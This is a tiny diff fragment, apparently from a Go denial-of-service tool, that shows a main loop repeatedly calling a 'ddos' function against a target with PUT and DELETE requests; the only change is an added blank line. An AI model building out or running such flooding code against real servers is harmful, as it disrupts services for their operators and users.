@@ -26,5 +26,6 @@ func main() {
 		go ddos(target, "PUT")
 		ddos(target, "DELETE")
 	}
+
 	select {}
 }
